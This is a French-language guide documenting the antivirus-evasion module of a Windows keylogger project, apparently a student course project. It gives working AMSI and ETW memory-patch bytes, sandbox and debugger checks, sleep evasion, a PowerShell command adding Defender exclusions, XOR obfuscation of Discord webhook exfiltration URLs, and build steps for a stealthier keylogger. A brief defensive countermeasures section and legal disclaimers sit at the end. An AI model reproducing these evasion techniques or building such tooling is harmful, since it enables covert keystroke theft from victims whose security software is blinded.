# Guide d'Évasion Antivirus (AV Evasion)

**ATTENTION**: Ce document est à usage pédagogique uniquement, dans le cadre de formations en cybersécurité et tests de sécurité autorisés en environnement isolé.

## Vue d'ensemble

Le module `av_evasion.py` implémente plusieurs techniques avancées pour contourner la détection antivirus. Ce guide explique chaque technique et comment elles sont utilisées.

---

## Techniques Implémentées

### 1. Détection de Sandbox/VM (Sandbox Detection)

**Principe**: Les antivirus analysent les fichiers suspects dans des machines virtuelles (sandboxes) pour observer leur comportement. Si le programme détecte qu'il est dans un sandbox, il peut se comporter différemment ou attendre.

**Méthodes de détection**:
- ✅ **Fichiers VM**: Recherche de drivers VMware, VirtualBox
  - `Vmmouse.sys`, `vmhgfs.sys`, `VBoxMouse.sys`, `VBoxGuest.sys`
- ✅ **RAM insuffisante**: VMs ont souvent < 4GB
- ✅ **CPU count**: VMs ont souvent < 2 cores
- ✅ **Nombre de processus**: Sandboxes ont < 50 processus
- ✅ **Taille disque**: Disques virtuels < 60GB
- ✅ **Fichiers récents**: Pas d'activité utilisateur récente

**Code**:
```python
is_sandbox, score, checks = AVEvasion.advanced_sandbox_detection()
if is_sandbox:
    # Délai adaptatif basé sur le score de confiance
    delay_time = min(60 + (score * 20), 180)  # 60-180 secondes
    AVEvasion.delay_execution(delay_time)
```

**Efficacité**: ⭐⭐⭐⭐ - Très efficace contre les sandboxes standards

---

### 2. Détection de Débogueur (Debugger Detection)

**Principe**: Les analystes utilisent des débogueurs pour analyser le malware. On peut détecter leur présence via l'API Windows.

**Méthode**:
```python
ctypes.windll.kernel32.IsDebuggerPresent()
```

**Action**: Si un débogueur est détecté → **exit immédiat**

**Efficacité**: ⭐⭐⭐⭐⭐ - Bloque l'analyse dynamique basique

---

### 3. AMSI Bypass (Antimalware Scan Interface)

**Principe**: AMSI est un composant Windows qui scanne le code PowerShell, VBS, JavaScript et Python en mémoire. On peut le désactiver en patchant sa fonction en mémoire.

**Technique**:
1. Charger `amsi.dll`
2. Trouver l'adresse de `AmsiScanBuffer`
3. Modifier la protection mémoire (`VirtualProtect`)
4. Écrire un patch qui retourne toujours "clean"
5. Restaurer la protection

**Code du patch**:
```python
patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 0x80070057; ret
# Retourne ERROR_INVALID_PARAMETER = fichier considéré "clean"
```

**Efficacité**: ⭐⭐⭐⭐⭐ - Désactive complètement le scan AMSI

**Note**: Nécessite des droits d'exécution en mémoire (généralement disponibles)

---

### 4. ETW Bypass (Event Tracing for Windows)

**Principe**: ETW est utilisé par Windows Defender pour surveiller le comportement des processus. On peut le désactiver en patchant `EtwEventWrite`.

**Technique**:
1. Charger `ntdll.dll`
2. Trouver `EtwEventWrite`
3. Patcher avec une instruction `ret` (return immédiat)
4. Plus aucun événement n'est envoyé à Defender

**Code du patch**:
```python
patch = b"\xC3"  # ret instruction
```

**Efficacité**: ⭐⭐⭐⭐⭐ - Aveugle Defender sur le comportement

---

### 5. Délai d'Exécution (Sleep Evasion)

**Principe**: Les sandboxes ont un temps d'analyse limité (30-120 secondes). En retardant l'exécution, on dépasse ce délai.

**Méthodes de délai**:
1. **Sleep classique**: `time.sleep()`
2. **Busy wait**: Boucle avec calculs (anti-accélération)
3. **I/O délai**: Lecture/écriture fichiers (difficile à accélérer)

**Délai adaptatif**:
```python
# Score de confiance sandbox: 0-8
# Plus le score est élevé, plus on attend longtemps
delay_time = min(60 + (score * 20), 180)  # 60-180 secondes
```

**Efficacité**: ⭐⭐⭐⭐ - Dépasse le temps d'analyse sandbox

---

### 6. Ajout d'Exclusions Defender

**Principe**: Si le programme s'exécute avec des droits admin, il peut tenter d'ajouter son dossier aux exclusions Windows Defender.

**Commande PowerShell**:
```powershell
Add-MpPreference -ExclusionPath "C:\path\to\program"
```

**Efficacité**: ⭐⭐ - Nécessite droits admin + peut être bloqué

---

### 7. Obfuscation de Strings

**Principe**: Les AVs utilisent des signatures (strings hardcodés) pour identifier les malwares. L'obfuscation cache ces strings.

**Technique XOR**:
```python
def _d(s, k=0x42):
    """Decode obfuscated string"""
    return ''.join(chr(ord(c) ^ k) for c in s)

# Au lieu de:
url = "discord.com/api/webhooks"

# Utiliser:
url = _d("\x26\x2b\x31\x29\x2d\x30\x26\x08\x29\x2d\x2f\x1c\x27\x2b\x1c\x33\x25\x28\x2a\x2d\x2d\x21\x31")
```

**Strings à obfusquer**:
- URLs Discord/webhook
- Noms de modules (pynput, keyboard)
- Fonctions Windows API
- Chemins fichiers

**Outil fourni**: `tools/obfuscate_strings.py`

**Efficacité**: ⭐⭐⭐⭐ - Contourne les signatures statiques

---

## Utilisation

### Mode Automatique (Recommandé)

Le fichier `keylogger_windows_advanced.py` utilise automatiquement toutes les techniques:

```python
if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
    AVEvasion.run_all_evasions()
```

Cette fonction unique:
1. ✅ Détecte les débogueurs → exit si détecté
2. ✅ Détection sandbox avancée (score de confiance)
3. ✅ Délai adaptatif si sandbox détecté
4. ✅ Patch AMSI
5. ✅ Patch ETW
6. ✅ Ajoute exclusions Defender (si admin)

### Mode Manuel

Pour des tests spécifiques:

```python
from modules.av_evasion import AVEvasion

# Test debugger
if AVEvasion.check_debugger():
    print("Debugger detected!")

# Test sandbox
is_sandbox, score, checks = AVEvasion.advanced_sandbox_detection()
print(f"Sandbox: {is_sandbox}, Score: {score}, Checks: {checks}")

# Patch AMSI
if AVEvasion.patch_amsi():
    print("AMSI bypassed!")

# Patch ETW
if AVEvasion.patch_etw():
    print("ETW bypassed!")
```

---

## Configuration

Dans `keylogger_windows_advanced.py`:

```python
ENABLE_AV_EVASION = True  # Activer l'évasion AV
SANDBOX_DELAY = 65        # Délai minimal (secondes) - obsolète, utilise délai adaptatif
```

**Note**: Le délai est maintenant adaptatif basé sur le score de confiance sandbox.

---

## Rebuild avec Évasion

### Étape 1: Builder Standard

```bash
python tools/builder_advanced.py
```

L'évasion AV est **automatiquement incluse** dans le build.

### Étape 2: Obfuscation (Optionnel - Plus Furtif)

Pour une furtivité maximale, obfusquez les strings:

```bash
# Obfusquer le code source
python tools/obfuscate_strings.py src/windows/keylogger_windows_advanced.py

# Builder avec le code obfusqué
python tools/builder_advanced.py
```

**Attention**: L'obfuscation peut casser certains imports. Testez toujours après obfuscation.

---

## Ordre d'Exécution

Au démarrage du programme:

```
1. Cache la console (Windows)
   ↓
2. Import des modules
   ↓
3. main() appelé
   ↓
4. AVEvasion.run_all_evasions()
   ├─ Check debugger → EXIT si détecté
   ├─ Détection sandbox avancée
   ├─ Délai adaptatif (60-180s si sandbox)
   ├─ Patch AMSI
   ├─ Patch ETW
   └─ Ajoute exclusions (si admin)
   ↓
5. Mode watchdog OU worker
   ↓
6. Si watchdog:
   ├─ Installe persistence
   ├─ Copie avec nom aléatoire
   └─ Lance worker + monitoring
   ↓
7. Si worker:
   └─ Lance keylogger
```

---

## Debugging / Logs

Les fonctions d'évasion sont **silencieuses** (pas de logs) pour éviter la détection. Pour déboguer:

1. Désactiver temporairement:
```python
ENABLE_AV_EVASION = False
```

2. Tester individuellement dans un script:
```python
# test_evasion.py
from modules.av_evasion import AVEvasion

print("Testing debugger:", AVEvasion.check_debugger())
is_sb, score, checks = AVEvasion.advanced_sandbox_detection()
print(f"Sandbox: {is_sb}, Score: {score}, Checks: {checks}")
print("AMSI patch:", AVEvasion.patch_amsi())
print("ETW patch:", AVEvasion.patch_etw())
```

---

## Limitations Connues

### 1. Détection Heuristique
Les AVs modernes utilisent l'apprentissage automatique. Ces techniques contournent les **signatures statiques** et le **comportement sandbox**, mais pas l'analyse heuristique avancée.

### 2. Droits Administrateur
Certaines techniques (exclusions Defender) nécessitent des droits admin.

### 3. Mises à Jour AV
Les AVs évoluent constamment. Ces techniques fonctionnent à la date du 27/12/2025 mais peuvent être contournées par des mises à jour futures.

### 4. Sandboxes Avancées
Les sandboxes professionnelles (Cuckoo modifié, Any.Run Pro) détectent certaines techniques. Le score de confiance aide mais n'est pas parfait.

---

## Contre-Mesures (Défense)

En tant que défenseur, comment détecter ces techniques:

### 1. Détection des Patchs Mémoire
- Surveiller `VirtualProtect` sur `amsi.dll` / `ntdll.dll`
- Vérifier l'intégrité de `AmsiScanBuffer` / `EtwEventWrite`

### 2. Détection des Délais Suspects
- Processus qui sleep > 60s au démarrage
- Boucles busy-wait intensives

### 3. Analyse Comportementale
- Processus qui vérifient VM artifacts
- Appels à `IsDebuggerPresent`
- Tentatives d'ajout d'exclusions Defender

### 4. Sandbox Evasion Detection
- Honeypots: Faux fichiers VM pour détecter la vérification
- Temps d'analyse étendu (> 5 minutes)
- Émulation complète du système (plus de 50 processus, activité récente simulée)

---

## Avertissements Légaux

⚠️ **IMPORTANT**:
- Ces techniques sont **UNIQUEMENT** pour l'éducation et les tests autorisés
- L'utilisation malveillante est **ILLÉGALE**
- Utilisez **UNIQUEMENT** dans un environnement de test isolé
- Obtenez toujours une autorisation écrite avant tout test de sécurité

📚 **Cadre pédagogique**:
- Formation en cybersécurité défensive
- Compréhension des techniques d'attaque
- Amélioration des systèmes de détection
- Tests de pénétration autorisés

---

## Ressources Supplémentaires

- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [AMSI Bypass Techniques](https://rastamouse.me/blog/asb-bypass-pt3/)
- [ETW Patching](https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider)
- [Sandbox Detection](https://evasions.checkpoint.com/)

---

## Changelog

### Version 2.1 (27/12/2025)
- ✅ Ajout AMSI bypass via memory patching
- ✅ Ajout ETW bypass
- ✅ Détection sandbox avancée (score de confiance)
- ✅ Délai adaptatif basé sur score sandbox
- ✅ Fonction `run_all_evasions()` unique
- ✅ Outil d'obfuscation strings

### Version 2.0
- ✅ Détection sandbox basique
- ✅ Détection débogueur
- ✅ Sleep evasion
- ✅ Ajout exclusions Defender

---

**Auteur**: KeyPyLogger Educational Project
**Date**: 27/12/2025
**Contexte**: Epitech - Module Cyber sécurité Windows
